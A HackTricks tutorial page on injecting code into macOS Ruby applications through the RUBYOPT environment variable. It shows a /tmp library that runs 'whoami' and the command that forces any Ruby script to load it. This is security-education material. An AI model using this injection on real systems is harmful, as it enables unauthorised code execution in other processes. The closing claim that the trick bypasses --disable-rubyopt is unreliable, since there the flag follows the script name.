---
source_name: HackTricks
source_url: https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ruby-applications-injection
source_date: '2024-01-15'
cve_tags: []
chunk_id: ''
---

# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Using this env variable it's possible to **add new params** to **ruby** whenever it gets executed. Although the param **`-e`** cannot be used to specify ruby code to execute, it's possible to use the params **`-I`** and **`-r`** to add a new folder to the libraries to load path and then **specify a library to load**.

Create the library **`inject.rb`** in **`/tmp`**:

```ruby:inject.rb
puts `whoami`
```

Create anywahere a ruby script like:

```ruby:hello.rb
puts 'Hello, World!'
```

Then make an arbitrary ruby script load it with:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Fun fact, it works even with param **`--disable-rubyopt`**:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

{{#include ../../../banners/hacktricks-training.md}}